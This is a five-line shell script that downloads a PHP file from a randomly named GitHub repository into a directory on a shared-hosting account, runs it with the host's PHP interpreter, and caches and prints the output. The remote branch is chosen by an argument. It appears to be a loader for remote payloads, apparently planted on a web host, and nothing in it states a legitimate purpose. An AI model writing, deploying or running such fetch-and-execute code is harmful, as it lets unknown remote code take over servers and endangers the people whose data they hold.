#!/bin/sh
D=/home/u791571885/dgq48; mkdir -p $D; cd $D || exit 1
[ -f out.txt ] && { cat out.txt; exit 0; }
curl -fsSL -o vq48.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vq48.php"
/opt/alt/php83/usr/bin/php vq48.php > out.tmp 2>&1; mv out.tmp out.txt; cat out.txt
